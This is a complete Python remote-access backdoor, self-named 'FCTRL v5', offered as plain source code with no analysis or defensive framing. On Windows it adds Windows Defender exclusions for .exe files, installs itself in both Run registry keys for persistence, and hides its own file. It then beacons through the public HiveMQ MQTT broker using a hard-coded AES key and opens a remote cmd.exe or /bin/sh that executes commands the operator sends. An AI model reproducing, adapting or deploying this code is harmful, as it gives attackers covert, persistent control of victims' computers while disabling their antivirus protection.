import paho.mqtt.client as mqtt
import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64
import uuid
import json
import os
import sys
import subprocess
import threading
import time

def exec_path():
    if getattr(sys, "frozen", False):
        application_path = sys.executable
    elif __file__:
        application_path = os.path.abspath(__file__)
    return application_path

if os.name == "nt":
    os.system('reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f')
    os.system('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f')
    os.system(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "FCTRL v5" /d "{exec_path()}" /f')
    os.system(f'reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "FCTRL v5" /d "{exec_path()}" /f')
    os.system(f'attrib +s +h +a "{exec_path()}"')

default_shell = "cmd.exe" if os.name == "nt" else "/bin/sh"
hostname = f"{os.getpid()}@{socket.gethostname()}"
sessions = {}

key = b"fe333581d9f246ee" # get_random_bytes(16)
cipher = AES.new(key, AES.MODE_CBC)
iv = cipher.iv

def encrypt_message(message, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_message = cipher.encrypt(pad(message.encode("utf-8"), AES.block_size))
    return base64.b64encode(iv + encrypted_message).decode("utf-8")

def decrypt_message(encrypted_message, key):
    try:
        encrypted_message = base64.b64decode(encrypted_message)
        iv = encrypted_message[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_message = unpad(cipher.decrypt(encrypted_message[AES.block_size:]), AES.block_size)
        return decrypted_message.decode("utf-8")
    except (ValueError, KeyError):
        return None
    
def handle_output(session_id):
    pipe = sessions[session_id].stdout

    sys.stdout.write("")
    sys.stdout.flush()

    while True:
        output = pipe.readline(1)
        
        if output:
            publish_json_message(client, topic, {
                "type": "cmdoutput",
                "session_id": session_id,
                "output": output
            })
        else:
            publish_json_message(client, topic, {
                "type": "end_session",
                "target": hostname,
                "session_id": session_id
            })
            sessions[session_id].terminate()
            break

broker = "broker.hivemq.com"
port = 1883
topic = "FCTRL/secure"

def on_connect(client, userdata, flags, rc):
    print(f"[+] Connected with result code {rc}")
    client.subscribe(topic)

def on_message(client, userdata, msg):
    decrypted_message = decrypt_message(msg.payload.decode("utf-8"), key)
    if decrypted_message is not None:
        try:
            json_message = json.loads(decrypted_message)
            
            if json_message.get("target") == hostname:
                if json_message.get("type") == "new_session":
                    session_id = uuid.uuid4().hex

                    message_id = json_message.get("message_id")
                    
                    publish_json_message(client, topic, {
                        "type": "confirm_session",
                        "message_id": message_id,
                        "session_id": session_id
                    })
                if json_message.get("type") == "start_session":
                    session_id = json_message.get("session_id")

                    sessions[session_id] = subprocess.Popen(default_shell, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding="utf-8", text=True)
                    threading.Thread(target=handle_output, args=(session_id,), daemon=True).start()
                if json_message.get("type") == "cmd_input":
                    session_id = json_message.get("session_id")
                    command = json_message.get("input")
        
                    if session_id in sessions:
                        sessions[session_id].stdin.write(command + "\n")
                        sessions[session_id].stdin.flush()
        except json.JSONDecodeError:
            print("[-] Failed to decode JSON from the message")
    else:
        print("[-] Failed to decrypt the message")

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

def publish_json_message(client, topic, message:json):
    json_message = json.dumps(message)
    iv = get_random_bytes(16)
    encrypted_message = encrypt_message(json_message, key, iv)
    client.publish(topic, encrypted_message)

while True:
    try:
        client.connect(broker, port, 60)
        break
    except Exception as e:
        print(f"[-] Connection error: {e}. Retrying in 5 seconds...")
        time.sleep(5)

client.loop_start()

def update_status():
    while True:
        publish_json_message(client, topic, {
            "type": "status",
            "client": hostname
        })
        time.sleep(0.5)

threading.Thread(target=update_status, daemon=True).start()

try:
    while True:
        pass
except KeyboardInterrupt:
    print("[-] Disconnecting from broker")
    client.loop_stop()
    client.disconnect()
finally:
    for session in sessions:
        publish_json_message(client, topic, {
            "type": "end_session",
            "target": hostname,
            "session_id": session
        })
        sessions[session].terminate()
